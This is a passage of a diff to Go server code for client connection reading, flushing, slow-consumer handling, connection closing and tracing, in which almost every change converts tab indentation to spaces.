{\n-\t\t\t\t\tc.Error(err)\n-\t\t\t\t\tc.closeConnection(ProtocolViolation)\n-\t\t\t\t}\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\n-\t\t// Updates stats for client and server that were collected\n-\t\t// from parsing through the buffer.\n-\t\tif c.in.msgs > 0 {\n-\t\t\tatomic.AddInt64(&c.inMsgs, int64(c.in.msgs))\n-\t\t\tatomic.AddInt64(&c.inBytes, int64(c.in.bytes))\n-\t\t\tatomic.AddInt64(&s.inMsgs, int64(c.in.msgs))\n-\t\t\tatomic.AddInt64(&s.inBytes, int64(c.in.bytes))\n-\t\t}\n-\n-\t\t// Signal to writeLoop to flush to socket.\n-\t\tlast := c.flushClients(0)\n-\n-\t\t// Update activity, check read buffer size.\n-\t\tc.mu.Lock()\n-\n-\t\t// Activity based on interest changes or data/msgs.\n-\t\tif c.in.msgs > 0 || c.in.subs > 0 {\n-\t\t\tc.last = last\n-\t\t}\n-\n-\t\tif n >= cap(b) {\n-\t\t\tc.in.srs = 0\n-\t\t} else if n < cap(b)/2 { // divide by 2 b/c we want less than what we would shrink to.\n-\t\t\tc.in.srs++\n-\t\t}\n-\n-\t\t// Update read buffer size as/if needed.\n-\t\tif n >= cap(b) && cap(b) < maxBufSize {\n-\t\t\t// Grow\n-\t\t\tc.in.rsz = int32(cap(b) * 2)\n-\t\t\tb = make([]byte, c.in.rsz)\n-\t\t} else if n < cap(b) && cap(b) > minBufSize && c.in.srs > shortsToShrink {\n-\t\t\t// Shrink, for now don't accelerate, ping/pong will eventually sort it out.\n-\t\t\tc.in.rsz = int32(cap(b) / 2)\n-\t\t\tb = make([]byte, c.in.rsz)\n-\t\t}\n-\t\t// re-snapshot the account since it can change during reload, etc.\n-\t\tacc = c.acc\n-\t\t// Refresh nc because in some cases, we have upgraded c.nc to TLS.\n-\t\tnc = c.nc\n-\t\tc.mu.Unlock()\n-\n-\t\t// Connection was closed\n-\t\tif nc == nil {\n-\t\t\treturn\n-\t\t}\n-\n-\t\tif dur := time.Since(start); dur >= readLoopReportThreshold {\n-\t\t\tc.Warnf(\"Readloop processing time: %v\", dur)\n-\t\t}\n-\n-\t\t// We could have had a read error from above but still read some data.\n-\t\t// If so do the close here unconditionally.\n-\t\tif err != nil {\n-\t\t\tc.closeConnection(closedStateForErr(err))\n-\t\t\treturn\n-\t\t}\n-\n-\t\tif cpacc && (start.Sub(lpacc)) >= closedSubsCheckInterval {\n-\t\t\tc.pruneClosedSubFromPerAccountCache()\n-\t\t\tlpacc = time.Now()\n-\t\t}\n-\t}\n+        // Grab the connection off the client, it will be cleared on a close.\n+        // We check for that after the loop, but want to avoid a nil dereference\n+        c.mu.Lock()\n+        s := c.srv\n+        defer s.grWG.Done()\n+        if c.isClosed() {\n+                c.mu.Unlock()\n+                return\n+        }\n+        nc := c.nc\n+        ws := c.isWebsocket()\n+        if c.isMqtt() {\n+                c.mqtt.r = &mqttReader{reader: nc}\n+        }\n+        c.in.rsz = startBufSize\n+\n+        // Check the per-account-cache for closed subscriptions\n+        cpacc := c.kind == ROUTER || c.kind == GATEWAY\n+        // Last per-account-cache check for closed subscriptions\n+        lpacc := time.Now()\n+        acc := c.acc\n+        var masking bool\n+        if ws {\n+                masking = c.ws.maskread\n+        }\n+        c.mu.Unlock()\n+\n+        defer func() {\n+                if c.isMqtt() {\n+                        s.mqttHandleClosedClient(c)\n+                }\n+                // These are used only in the readloop, so we can set them to nil\n+                // on exit of the readLoop.\n+                c.in.results, c.in.pacache = nil, nil\n+        }()\n+\n+        // Start read buffer.\n+        b := make([]byte, c.in.rsz)\n+\n+        // Websocket clients will return several slices if there are multiple\n+        // websocket frames in the blind read. For non WS clients though, we\n+        // will always have 1 slice per loop iteration. So we define this here\n+        // so non WS clients will use bufs[0] = b[:n].\n+        var _bufs [1][]byte\n+        bufs := _bufs[:1]\n+\n+        var wsr *wsReadInfo\n+        if ws {\n+                wsr = &wsReadInfo{mask: masking}\n+                wsr.init()\n+        }\n+\n+        for {\n+                var n int\n+                var err error\n+\n+                // If we have a pre buffer parse that first.\n+                if len(pre) > 0 {\n+                        b = pre\n+                        n = len(pre)\n+                        pre = nil\n+                } else {\n+                        n, err = nc.Read(b)\n+                        // If we have any data we will try to parse and exit at the end.\n+                        if n == 0 && err != nil {\n+                                c.closeConnection(closedStateForErr(err))\n+                                return\n+                        }\n+                }\n+                if ws {\n+                        bufs, err = c.wsRead(wsr, nc, b[:n])\n+                        if bufs == nil && err != nil {\n+                                if err != io.EOF {\n+                                        c.Errorf(\"read error: %v\", err)\n+                                }\n+                                c.closeConnection(closedStateForErr(err))\n+                        } else if bufs == nil {\n+                                continue\n+                        }\n+                } else {\n+                        bufs[0] = b[:n]\n+                }\n+                start := time.Now()\n+\n+                // Check if the account has mappings and if so set the local readcache flag.\n+                // We check here to make sure any changes such as config reload are reflected here.\n+                if c.kind == CLIENT || c.kind == LEAF {\n+                        if acc.hasMappings() {\n+                                c.in.flags.set(hasMappings)\n+                        } else {\n+                                c.in.flags.clear(hasMappings)\n+                        }\n+                }\n+\n+                // Clear inbound stats cache\n+                c.in.msgs = 0\n+                c.in.bytes = 0\n+                c.in.subs = 0\n+\n+                // Main call into parser for inbound data. This will generate callouts\n+                // to process messages, etc.\n+                for i := 0; i < len(bufs); i++ {\n+                        if err := c.parse(bufs[i]); err != nil {\n+                                if dur := time.Since(start); dur >= readLoopReportThreshold {\n+                                        c.Warnf(\"Readloop processing time: %v\", dur)\n+                                }\n+                                // Need to call flushClients because some of the clients have been\n+                                // assigned messages and their \"fsp\" incremented, and need now to be\n+                                // decremented and their writeLoop signaled.\n+                                c.flushClients(0)\n+                                // handled inline\n+                                if err != ErrMaxPayload && err != ErrAuthentication {\n+                                        c.Error(err)\n+                                        c.closeConnection(ProtocolViolation)\n+                                }\n+                                return\n+                        }\n+                }\n+\n+                // Updates stats for client and server that were collected\n+                // from parsing through the buffer.\n+                if c.in.msgs > 0 {\n+                        atomic.AddInt64(&c.inMsgs, int64(c.in.msgs))\n+                        atomic.AddInt64(&c.inBytes, int64(c.in.bytes))\n+                        atomic.AddInt64(&s.inMsgs, int64(c.in.msgs))\n+                        atomic.AddInt64(&s.inBytes, int64(c.in.bytes))\n+                }\n+\n+                // Signal to writeLoop to flush to socket.\n+                last := c.flushClients(0)\n+\n+                // Update activity, check read buffer size.\n+                c.mu.Lock()\n+\n+                // Activity based on interest changes or data/msgs.\n+                if c.in.msgs > 0 || c.in.subs > 0 {\n+                        c.last = last\n+                }\n+\n+                if n >= cap(b) {\n+                        c.in.srs = 0\n+                } else if n < cap(b)/2 { // divide by 2 b/c we want less than what we would shrink to.\n+                        c.in.srs++\n+                }\n+\n+                // Update read buffer size as/if needed.\n+                if n >= cap(b) && cap(b) < maxBufSize {\n+                        // Grow\n+                        c.in.rsz = int32(cap(b) * 2)\n+                        b = make([]byte, c.in.rsz)\n+                } else if n < cap(b) && cap(b) > minBufSize && c.in.srs > shortsToShrink {\n+                        // Shrink, for now don't accelerate, ping/pong will eventually sort it out.\n+                        c.in.rsz = int32(cap(b) / 2)\n+                        b = make([]byte, c.in.rsz)\n+                }\n+                // re-snapshot the account since it can change during reload, etc.\n+                acc = c.acc\n+                // Refresh nc because in some cases, we have upgraded c.nc to TLS.\n+                nc = c.nc\n+                c.mu.Unlock()\n+\n+                // Connection was closed\n+                if nc == nil {\n+                        return\n+                }\n+\n+                if dur := time.Since(start); dur >= readLoopReportThreshold {\n+                        c.Warnf(\"Readloop processing time: %v\", dur)\n+                }\n+\n+                // We could have had a read error from above but still read some data.\n+                // If so do the close here unconditionally.\n+                if err != nil {\n+                        c.closeConnection(closedStateForErr(err))\n+                        return\n+                }\n+\n+                if cpacc && (start.Sub(lpacc)) >= closedSubsCheckInterval {\n+                        c.pruneClosedSubFromPerAccountCache()\n+                        lpacc = time.Now()\n+                }\n+        }\n }\n \n // Returns the appropriate closed state for a given read error.\n func closedStateForErr(err error) ClosedState {\n-\tif err == io.EOF {\n-\t\treturn ClientClosed\n-\t}\n-\treturn ReadError\n+        if err == io.EOF {\n+                return ClientClosed\n+        }\n+        return ReadError\n }\n \n // collapsePtoNB will place primary onto nb buffer as needed in prep for WriteTo.\n // This will return a copy on purpose.\n func (c *client) collapsePtoNB() (net.Buffers, int64) {\n-\tif c.isWebsocket() {\n-\t\treturn c.wsCollapsePtoNB()\n-\t}\n-\tif c.out.p != nil {\n-\t\tp := c.out.p\n-\t\tc.out.p = nil\n-\t\treturn append(c.out.nb, p), c.out.pb\n-\t}\n-\treturn c.out.nb, c.out.pb\n+        if c.isWebsocket() {\n+                return c.wsCollapsePtoNB()\n+        }\n+        if c.out.p != nil {\n+                p := c.out.p\n+                c.out.p = nil\n+                return append(c.out.nb, p), c.out.pb\n+        }\n+        return c.out.nb, c.out.pb\n }\n \n // This will handle the fixup needed on a partial write.\n // Assume pending has been already calculated correctly.\n func (c *client) handlePartialWrite(pnb net.Buffers) {\n-\tif c.isWebsocket() {\n-\t\tc.ws.frames = append(pnb, c.ws.frames...)\n-\t\treturn\n-\t}\n-\tnb, _ := c.collapsePtoNB()\n-\t// The partial needs to be first, so append nb to pnb\n-\tc.out.nb = append(pnb, nb...)\n+        if c.isWebsocket() {\n+                c.ws.frames = append(pnb, c.ws.frames...)\n+                return\n+        }\n+        nb, _ := c.collapsePtoNB()\n+        // The partial needs to be first, so append nb to pnb\n+        c.out.nb = append(pnb, nb...)\n }\n \n // flushOutbound will flush outbound buffer to a client.\n // Will return true if data was attempted to be written.\n // Lock must be held\n func (c *client) flushOutbound() bool {\n-\tif c.flags.isSet(flushOutbound) {\n-\t\t// For CLIENT connections, it is possible that the readLoop calls\n-\t\t// flushOutbound(). If writeLoop and readLoop compete and we are\n-\t\t// here we should release the lock to reduce the risk of spinning.\n-\t\tc.mu.Unlock()\n-\t\truntime.Gosched()\n-\t\tc.mu.Lock()\n-\t\treturn false\n-\t}\n-\tc.flags.set(flushOutbound)\n-\tdefer c.flags.clear(flushOutbound)\n-\n-\t// Check for nothing to do.\n-\tif c.nc == nil || c.srv == nil || c.out.pb == 0 {\n-\t\treturn true // true because no need to queue a signal.\n-\t}\n-\n-\t// Place primary on nb, assign primary to secondary, nil out nb and secondary.\n-\tnb, attempted := c.collapsePtoNB()\n-\tc.out.p, c.out.nb, c.out.s = c.out.s, nil, nil\n-\tif nb == nil {\n-\t\treturn true\n-\t}\n-\n-\t// For selecting primary replacement.\n-\tcnb := nb\n-\tvar lfs int\n-\tif len(cnb) > 0 {\n-\t\tlfs = len(cnb[0])\n-\t}\n-\n-\t// In case it goes away after releasing the lock.\n-\tnc := c.nc\n-\tapm := c.out.pm\n-\n-\t// Capture this (we change the value in some tests)\n-\twdl := c.out.wdl\n-\t// Do NOT hold lock during actual IO.\n-\tc.mu.Unlock()\n-\n-\t// flush here\n-\tstart := time.Now()\n-\n-\t// FIXME(dlc) - writev will do multiple IOs past 1024 on\n-\t// most platforms, need to account for that with deadline?\n-\tnc.SetWriteDeadline(start.Add(wdl))\n-\n-\t// Actual write to the socket.\n-\tn, err := nb.WriteTo(nc)\n-\tnc.SetWriteDeadline(time.Time{})\n-\n-\tlft := time.Since(start)\n-\n-\t// Re-acquire client lock.\n-\tc.mu.Lock()\n-\n-\t// Ignore ErrShortWrite errors, they will be handled as partials.\n-\tif err != nil && err != io.ErrShortWrite {\n-\t\t// Handle timeout error (slow consumer) differently\n-\t\tif ne, ok := err.(net.Error); ok && ne.Timeout() {\n-\t\t\tif closed := c.handleWriteTimeout(n, attempted, len(cnb)); closed {\n-\t\t\t\treturn true\n-\t\t\t}\n-\t\t} else {\n-\t\t\t// Other errors will cause connection to be closed.\n-\t\t\t// For clients, report as debug but for others report as error.\n-\t\t\treport := c.Debugf\n-\t\t\tif c.kind != CLIENT {\n-\t\t\t\treport = c.Errorf\n-\t\t\t}\n-\t\t\treport(\"Error flushing: %v\", err)\n-\t\t\tc.markConnAsClosed(WriteError)\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\n-\t// Update flush time statistics.\n-\tc.out.lft = lft\n-\n-\t// Subtract from pending bytes and messages.\n-\tc.out.pb -= n\n-\tif c.isWebsocket() {\n-\t\tc.ws.fs -= n\n-\t}\n-\tc.out.pm -= apm // FIXME(dlc) - this will not be totally accurate on partials.\n-\n-\t// Check for partial writes\n-\t// TODO(dlc) - zero write with no error will cause lost message and the writeloop to spin.\n-\tif n != attempted && n > 0 {\n-\t\tc.handlePartialWrite(nb)\n-\t} else if int32(n) >= c.out.sz {\n-\t\tc.out.sws = 0\n-\t}\n-\n-\t// Adjust based on what we wrote plus any pending.\n-\tpt := n + c.out.pb\n-\n-\t// Adjust sz as needed downward, keeping power of 2.\n-\t// We do this at a slower rate.\n-\tif pt < int64(c.out.sz) && c.out.sz > minBufSize {\n-\t\tc.out.sws++\n-\t\tif c.out.sws > shortsToShrink {\n-\t\t\tc.out.sz >>= 1\n-\t\t}\n-\t}\n-\t// Adjust sz as needed upward, keeping power of 2.\n-\tif pt > int64(c.out.sz) && c.out.sz < maxBufSize {\n-\t\tc.out.sz <<= 1\n-\t}\n-\n-\t// Check to see if we can reuse buffers.\n-\tif lfs != 0 && n >= int64(lfs) {\n-\t\toldp := cnb[0][:0]\n-\t\tif cap(oldp) >= int(c.out.sz) {\n-\t\t\t// Replace primary or secondary if they are nil, reusing same buffer.\n-\t\t\tif c.out.p == nil {\n-\t\t\t\tc.out.p = oldp\n-\t\t\t} else if c.out.s == nil || cap(c.out.s) < int(c.out.sz) {\n-\t\t\t\tc.out.s = oldp\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// Check that if there is still data to send and writeLoop is in wait,\n-\t// then we need to signal.\n-\tif c.out.pb > 0 {\n-\t\tc.flushSignal()\n-\t}\n-\n-\t// Check if we have a stalled gate and if so and we are recovering release\n-\t// any stalled producers. Only kind==CLIENT will stall.\n-\tif c.out.stc != nil && (n == attempted || c.out.pb < c.out.mp/2) {\n-\t\tclose(c.out.stc)\n-\t\tc.out.stc = nil\n-\t}\n-\n-\treturn true\n+        if c.flags.isSet(flushOutbound) {\n+                // For CLIENT connections, it is possible that the readLoop calls\n+                // flushOutbound(). If writeLoop and readLoop compete and we are\n+                // here we should release the lock to reduce the risk of spinning.\n+                c.mu.Unlock()\n+                runtime.Gosched()\n+                c.mu.Lock()\n+                return false\n+        }\n+        c.flags.set(flushOutbound)\n+        defer c.flags.clear(flushOutbound)\n+\n+        // Check for nothing to do.\n+        if c.nc == nil || c.srv == nil || c.out.pb == 0 {\n+                return true // true because no need to queue a signal.\n+        }\n+\n+        // Place primary on nb, assign primary to secondary, nil out nb and secondary.\n+        nb, attempted := c.collapsePtoNB()\n+        c.out.p, c.out.nb, c.out.s = c.out.s, nil, nil\n+        if nb == nil {\n+                return true\n+        }\n+\n+        // For selecting primary replacement.\n+        cnb := nb\n+        var lfs int\n+        if len(cnb) > 0 {\n+                lfs = len(cnb[0])\n+        }\n+\n+        // In case it goes away after releasing the lock.\n+        nc := c.nc\n+        apm := c.out.pm\n+\n+        // Capture this (we change the value in some tests)\n+        wdl := c.out.wdl\n+        // Do NOT hold lock during actual IO.\n+        c.mu.Unlock()\n+\n+        // flush here\n+        start := time.Now()\n+\n+        // FIXME(dlc) - writev will do multiple IOs past 1024 on\n+        // most platforms, need to account for that with deadline?\n+        nc.SetWriteDeadline(start.Add(wdl))\n+\n+        // Actual write to the socket.\n+        n, err := nb.WriteTo(nc)\n+        nc.SetWriteDeadline(time.Time{})\n+\n+        lft := time.Since(start)\n+\n+        // Re-acquire client lock.\n+        c.mu.Lock()\n+\n+        // Ignore ErrShortWrite errors, they will be handled as partials.\n+        if err != nil && err != io.ErrShortWrite {\n+                // Handle timeout error (slow consumer) differently\n+                if ne, ok := err.(net.Error); ok && ne.Timeout() {\n+                        if closed := c.handleWriteTimeout(n, attempted, len(cnb)); closed {\n+                                return true\n+                        }\n+                } else {\n+                        // Other errors will cause connection to be closed.\n+                        // For clients, report as debug but for others report as error.\n+                        report := c.Debugf\n+                        if c.kind != CLIENT {\n+                                report = c.Errorf\n+                        }\n+                        report(\"Error flushing: %v\", err)\n+                        c.markConnAsClosed(WriteError)\n+                        return true\n+                }\n+        }\n+\n+        // Update flush time statistics.\n+        c.out.lft = lft\n+\n+        // Subtract from pending bytes and messages.\n+        c.out.pb -= n\n+        if c.isWebsocket() {\n+                c.ws.fs -= n\n+        }\n+        c.out.pm -= apm // FIXME(dlc) - this will not be totally accurate on partials.\n+\n+        // Check for partial writes\n+        // TODO(dlc) - zero write with no error will cause lost message and the writeloop to spin.\n+        if n != attempted && n > 0 {\n+                c.handlePartialWrite(nb)\n+        } else if int32(n) >= c.out.sz {\n+                c.out.sws = 0\n+        }\n+\n+        // Adjust based on what we wrote plus any pending.\n+        pt := n + c.out.pb\n+\n+        // Adjust sz as needed downward, keeping power of 2.\n+        // We do this at a slower rate.\n+        if pt < int64(c.out.sz) && c.out.sz > minBufSize {\n+                c.out.sws++\n+                if c.out.sws > shortsToShrink {\n+                        c.out.sz >>= 1\n+                }\n+        }\n+        // Adjust sz as needed upward, keeping power of 2.\n+        if pt > int64(c.out.sz) && c.out.sz < maxBufSize {\n+                c.out.sz <<= 1\n+        }\n+\n+        // Check to see if we can reuse buffers.\n+        if lfs != 0 && n >= int64(lfs) {\n+                oldp := cnb[0][:0]\n+                if cap(oldp) >= int(c.out.sz) {\n+                        // Replace primary or secondary if they are nil, reusing same buffer.\n+                        if c.out.p == nil {\n+                                c.out.p = oldp\n+                        } else if c.out.s == nil || cap(c.out.s) < int(c.out.sz) {\n+                                c.out.s = oldp\n+                        }\n+                }\n+        }\n+\n+        // Check that if there is still data to send and writeLoop is in wait,\n+        // then we need to signal.\n+        if c.out.pb > 0 {\n+                c.flushSignal()\n+        }\n+\n+        // Check if we have a stalled gate and if so and we are recovering release\n+        // any stalled producers. Only kind==CLIENT will stall.\n+        if c.out.stc != nil && (n == attempted || c.out.pb < c.out.mp/2) {\n+                close(c.out.stc)\n+                c.out.stc = nil\n+        }\n+\n+        return true\n }\n \n // This is invoked from flushOutbound() for io/timeout error (slow consumer).\n // Returns a boolean to indicate if the connection has been closed or not.\n // Lock is held on entry.\n func (c *client) handleWriteTimeout(written, attempted int64, numChunks int) bool {\n-\tif tlsConn, ok := c.nc.(*tls.Conn); ok {\n-\t\tif !tlsConn.ConnectionState().HandshakeComplete {\n-\t\t\t// Likely a TLSTimeout error instead...\n-\t\t\tc.markConnAsClosed(TLSHandshakeError)\n-\t\t\t// Would need to coordinate with tlstimeout()\n-\t\t\t// to avoid double logging, so skip logging\n-\t\t\t// here, and don't report a slow consumer error.\n-\t\t\treturn true\n-\t\t}\n-\t} else if c.flags.isSet(expectConnect) && !c.flags.isSet(connectReceived) {\n-\t\t// Under some conditions, a connection may hit a slow consumer write deadline\n-\t\t// before the authorization timeout. If that is the case, then we handle\n-\t\t// as slow consumer though we do not increase the counter as that can be\n-\t\t// misleading.\n-\t\tc.markConnAsClosed(SlowConsumerWriteDeadline)\n-\t\treturn true\n-\t}\n-\n-\t// Slow consumer here..\n-\tatomic.AddInt64(&c.srv.slowConsumers, 1)\n-\tc.Noticef(\"Slow Consumer Detected: WriteDeadline of %v exceeded with %d chunks of %d total bytes.\",\n-\t\tc.out.wdl, numChunks, attempted)\n-\n-\t// We always close CLIENT connections, or when nothing was written at all...\n-\tif c.kind == CLIENT || written == 0 {\n-\t\tc.markConnAsClosed(SlowConsumerWriteDeadline)\n-\t\treturn true\n-\t}\n-\treturn false\n+        if tlsConn, ok := c.nc.(*tls.Conn); ok {\n+                if !tlsConn.ConnectionState().HandshakeComplete {\n+                        // Likely a TLSTimeout error instead...\n+                        c.markConnAsClosed(TLSHandshakeError)\n+                        // Would need to coordinate with tlstimeout()\n+                        // to avoid double logging, so skip logging\n+                        // here, and don't report a slow consumer error.\n+                        return true\n+                }\n+        } else if c.flags.isSet(expectConnect) && !c.flags.isSet(connectReceived) {\n+                // Under some conditions, a connection may hit a slow consumer write deadline\n+                // before the authorization timeout. If that is the case, then we handle\n+                // as slow consumer though we do not increase the counter as that can be\n+                // misleading.\n+                c.markConnAsClosed(SlowConsumerWriteDeadline)\n+                return true\n+        }\n+\n+        // Slow consumer here..\n+        atomic.AddInt64(&c.srv.slowConsumers, 1)\n+        c.Noticef(\"Slow Consumer Detected: WriteDeadline of %v exceeded with %d chunks of %d total bytes.\",\n+                c.out.wdl, numChunks, attempted)\n+\n+        // We always close CLIENT connections, or when nothing was written at all...\n+        if c.kind == CLIENT || written == 0 {\n+                c.markConnAsClosed(SlowConsumerWriteDeadline)\n+                return true\n+        }\n+        return false\n }\n \n // Marks this connection has closed with the given reason.\n@@ -1526,140 +1526,140 @@ func (c *client) handleWriteTimeout(written, attempted int64, numChunks int) boo\n // Returns true if closed in place, flase otherwise.\n // Lock is held on entry.\n func (c *client) markConnAsClosed(reason ClosedState) {\n-\t// Possibly set skipFlushOnClose flag even if connection has already been\n-\t// mark as closed. The rationale is that a connection may be closed with\n-\t// a reason that justifies a flush (say after sending an -ERR), but then\n-\t// the flushOutbound() gets a write error. If that happens, connection\n-\t// being lost, there is no reason to attempt to flush again during the\n-\t// teardown when the writeLoop exits.\n-\tvar skipFlush bool\n-\tswitch reason {\n-\tcase ReadError, WriteError, SlowConsumerPendingBytes, SlowConsumerWriteDeadline, TLSHandshakeError:\n-\t\tc.flags.set(skipFlushOnClose)\n-\t\tskipFlush = true\n-\t}\n-\tif c.flags.isSet(connMarkedClosed) {\n-\t\treturn\n-\t}\n-\tc.flags.set(connMarkedClosed)\n-\t// For a websocket client, unless we are told not to flush, enqueue\n-\t// a websocket CloseMessage based on the reason.\n-\tif !skipFlush && c.isWebsocket() && !c.ws.closeSent {\n-\t\tc.wsEnqueueCloseMessage(reason)\n-\t}\n-\t// Be consistent with the creation: for routes, gateways and leaf,\n-\t// we use Noticef on create, so use that too for delete.\n-\tif c.srv != nil {\n-\t\tif c.kind == LEAF {\n-\t\t\tc.Noticef(\"%s connection closed: %s account: %s\", c.kindString(), reason, c.acc.traceLabel())\n-\t\t} else if c.kind == ROUTER || c.kind == GATEWAY {\n-\t\t\tc.Noticef(\"%s connection closed: %s\", c.kindString(), reason)\n-\t\t} else { // Client, System, Jetstream, and Account connections.\n-\t\t\tc.Debugf(\"%s connection closed: %s\", c.kindString(), reason)\n-\t\t}\n-\t}\n-\n-\t// Save off the connection if its a client or leafnode.\n-\tif c.kind == CLIENT || c.kind == LEAF {\n-\t\tif nc := c.nc; nc != nil && c.srv != nil {\n-\t\t\t// TODO: May want to send events to single go routine instead\n-\t\t\t// of creating a new go routine for each save.\n-\t\t\tgo c.srv.saveClosedClient(c, nc, reason)\n-\t\t}\n-\t}\n-\t// If writeLoop exists, let it do the final flush, close and teardown.\n-\tif c.flags.isSet(writeLoopStarted) {\n-\t\t// Since we want the writeLoop to do the final flush and tcp close,\n-\t\t// we want the reconnect to be done there too. However, it should'nt\n-\t\t// happen before the connection has been removed from the server\n-\t\t// state (end of closeConnection()). This ref count allows us to\n-\t\t// guarantee that.\n-\t\tc.rref++\n-\t\tc.flushSignal()\n-\t\treturn\n-\t}\n-\t// Flush (if skipFlushOnClose is not set) and close in place. If flushing,\n-\t// use a small WriteDeadline.\n-\tc.flushAndClose(true)\n+        // Possibly set skipFlushOnClose flag even if connection has already been\n+        // mark as closed. The rationale is that a connection may be closed with\n+        // a reason that justifies a flush (say after sending an -ERR), but then\n+        // the flushOutbound() gets a write error. If that happens, connection\n+        // being lost, there is no reason to attempt to flush again during the\n+        // teardown when the writeLoop exits.\n+        var skipFlush bool\n+        switch reason {\n+        case ReadError, WriteError, SlowConsumerPendingBytes, SlowConsumerWriteDeadline, TLSHandshakeError:\n+                c.flags.set(skipFlushOnClose)\n+                skipFlush = true\n+        }\n+        if c.flags.isSet(connMarkedClosed) {\n+                return\n+        }\n+        c.flags.set(connMarkedClosed)\n+        // For a websocket client, unless we are told not to flush, enqueue\n+        // a websocket CloseMessage based on the reason.\n+        if !skipFlush && c.isWebsocket() && !c.ws.closeSent {\n+                c.wsEnqueueCloseMessage(reason)\n+        }\n+        // Be consistent with the creation: for routes, gateways and leaf,\n+        // we use Noticef on create, so use that too for delete.\n+        if c.srv != nil {\n+                if c.kind == LEAF {\n+                        c.Noticef(\"%s connection closed: %s account: %s\", c.kindString(), reason, c.acc.traceLabel())\n+                } else if c.kind == ROUTER || c.kind == GATEWAY {\n+                        c.Noticef(\"%s connection closed: %s\", c.kindString(), reason)\n+                } else { // Client, System, Jetstream, and Account connections.\n+                        c.Debugf(\"%s connection closed: %s\", c.kindString(), reason)\n+                }\n+        }\n+\n+        // Save off the connection if its a client or leafnode.\n+        if c.kind == CLIENT || c.kind == LEAF {\n+                if nc := c.nc; nc != nil && c.srv != nil {\n+                        // TODO: May want to send events to single go routine instead\n+                        // of creating a new go routine for each save.\n+                        go c.srv.saveClosedClient(c, nc, reason)\n+                }\n+        }\n+        // If writeLoop exists, let it do the final flush, close and teardown.\n+        if c.flags.isSet(writeLoopStarted) {\n+                // Since we want the writeLoop to do the final flush and tcp close,\n+                // we want the reconnect to be done there too. However, it should'nt\n+                // happen before the connection has been removed from the server\n+                // state (end of closeConnection()). This ref count allows us to\n+                // guarantee that.\n+                c.rref++\n+                c.flushSignal()\n+                return\n+        }\n+        // Flush (if skipFlushOnClose is not set) and close in place. If flushing,\n+        // use a small WriteDeadline.\n+        c.flushAndClose(true)\n }\n \n // flushSignal will use server to queue the flush IO operation to a pool of flushers.\n // Lock must be held.\n func (c *client) flushSignal() {\n-\tc.out.sg.Signal()\n+        c.out.sg.Signal()\n }\n \n // Traces a message.\n // Will NOT check if tracing is enabled, does NOT need the client lock.\n func (c *client) traceMsg(msg []byte) {\n-\tmaxTrace := c.srv.getOpts().MaxTracedMsgLen\n-\tif maxTrace > 0 && (len(msg)-LEN_CR_LF) > maxTrace {\n-\t\ttm := fmt.Sprintf(\"%q\", msg[:maxTrace])\n-\t\tc.Tracef(\"<<- MSG_PAYLOAD: [\\\"%s...\\\"]\", tm[1:maxTrace+1])\n-\t} else {\n-\t\tc.Tracef(\"<<- MSG_PAYLOAD: [%q]\", msg[:len(msg)-LEN_CR_LF])\n-\t}\n+        maxTrace := c.srv.getOpts().MaxTracedMsgLen\n+        if maxTrace > 0 && (len(msg)-LEN_CR_LF) > maxTrace {\n+                tm := fmt.Sprintf(\"%q\", msg[:maxTrace])\n+                c.Tracef(\"<<- MSG_PAYLOAD: [\\\"%s...\\\"]\", tm[1:maxTrace+1])\n+        } else {\n+                c.Tracef(\"<<- MSG_PAYLOAD: [%q]\", msg[:len(msg)-LEN_CR_LF])\n+        }\n }\n \n // Traces an incoming operation.\n // Will NOT check if tracing is enabled, does NOT need the client lock.\n func (c *client) traceInOp(op string, arg []byte) {\n-\tc.traceOp(\"<<- %s\", op, arg)\n+        c.traceOp(\"<<- %s\", op, arg)\n }\n \n // Traces an outgoing operation.\n // Will NOT check if tracing is enabled, does NOT need the client lock.\n func (c *client) traceOutOp(op string, arg []byte) {\n-\tc.traceOp(\"->> %s\", op, arg)\n+        c.traceOp(\"->> %s\", op, arg)\n }\n \n func (c *client) traceOp(format, op string, arg []byte) {\n-\topa := []interface{}{}\n-\tif op != \"\" {\n-\t\topa = append(opa, op)\n-\t}\n-\tif arg != nil {\n-\t\topa = append(opa, string(arg))\n-\t}\n-\tc.Tracef(format, opa)\n+        opa := []interface{}{}\n+        if op != \"\" {\n+                opa = append(opa, op)\n+        }\n+        if arg != nil {\n+                opa = append(opa, string(arg))\n+        }\n+        c.Tracef(format, opa)\n }\n \n // Process the information messages from Clients and other Routes.\n func (c *client) processInfo(arg []byte) error {\n-\tinfo := Info{}\n-\tif err := json.Unmarshal(arg, &info); err != nil {\n-\t\treturn err\n-\t}\n-\tswitch c.kind {\n-\tcase ROUTER:\n-\t\tc.processRouteInfo(&info)\n-\tcase GATEWAY:\n-\t\tc.processGatewayInfo(&info)\n-\tcase LEAF:\n-\t\tc.processLeafnodeInfo(&info)\n-\t}\n-\treturn nil\n+        info := Info{}\n+        if err := json.Unmarshal(arg, &info); err != nil {\n+                return err\n+        }\n+        switch c.kind {\n+        case ROUTER:\n+                c.processRouteInfo(&info)\n+        case GATEWAY:\n+                c.processGatewayInfo(&info)\n+        case LEAF:\n+                c.processLeafnodeInfo(&info)\n+        }\n+        return nil\n }\n \n func (c *client) processErr(errStr string) {\n-\tclose := true\n-\tswitch c.kind {\n-\tcase CLIENT:\n-\t\tc.Errorf(\"Client Error %s\", errStr)\n-\tcase ROUTER:\n-\t\tc.Errorf(\"Route Error %s\", errStr)\n-\tcase GATEWAY:\n-\t\tc.Errorf(\"Gateway Error %s\", errStr)\n-\tcase LEAF:\n-\t\tc.Errorf(\"Leafnode Error %s\", errStr)\n-\t\tc.leafProcessErr(errStr)\n-\t\tclose = false\n-\tcase JETSTREAM:\n-\t\tc.Errorf(\"JetStream Error %s\", errStr)\n-\t}\n-\tif close {\n-\t\tc.closeConnection(ParseError)\n-\t}\n+        close := true\n+        switch c.kind {\n+        case CLIENT:\n+                c.Errorf(\"Client Error %s\", errStr)\n+        case ROUTER:\n+                c.Errorf(\"Route Error %s\", errStr)\n+        case GATEWAY:\n+                c.Errorf(\"Gateway Error %s\", errStr)\n+        case LEAF:\n+                c.Errorf(\"Leafnode Error %s\", errStr)\n+                c.leafProcessErr(errStr)\n+                close = false\n+        case JETSTREAM:\n+                c.Errorf(\"JetStream Error %s\", errStr)\n+        }\n+        if close {\n+                c.closeConnection(ParseError)\n+        }\n }\n \n // Password pattern matcher.\n@@ -1668,410 +1668,412 @@ var passPat = 